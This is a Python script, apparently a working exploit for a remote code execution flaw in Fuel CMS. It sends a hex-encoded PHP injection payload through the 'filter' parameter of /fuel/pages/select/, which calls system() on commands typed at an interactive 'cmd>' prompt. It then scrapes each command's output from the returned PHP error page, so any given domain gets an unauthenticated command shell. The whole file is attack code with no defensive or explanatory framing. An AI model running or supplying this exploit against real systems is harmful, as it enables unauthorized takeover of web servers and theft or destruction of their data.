import urllib.parse
import requests
import sys

if len(sys.argv) <= 1:
    print("More arguments needed!")
    print("Arguments: <domain>")
else:
    domain = sys.argv[1]
    url = "http://"+domain+"/fuel/pages/select/?filter="
    while True:
        try:
            cmd_raw = input("cmd> ")
            cmd = urllib.parse.quote_plus(cmd_raw)
            payload = "%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+cmd+"%27%29%2b%27"

            req = requests.get(url+payload)
            bd = req.text

            spl = bd.split("<h4>A PHP Error was encountered</h4>")
            spl1 = spl[0].split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
            spl2 = spl1[0].split("system")
            print(spl2[1])
        except KeyboardInterrupt:
            print("Exit!")
            sys.exit()
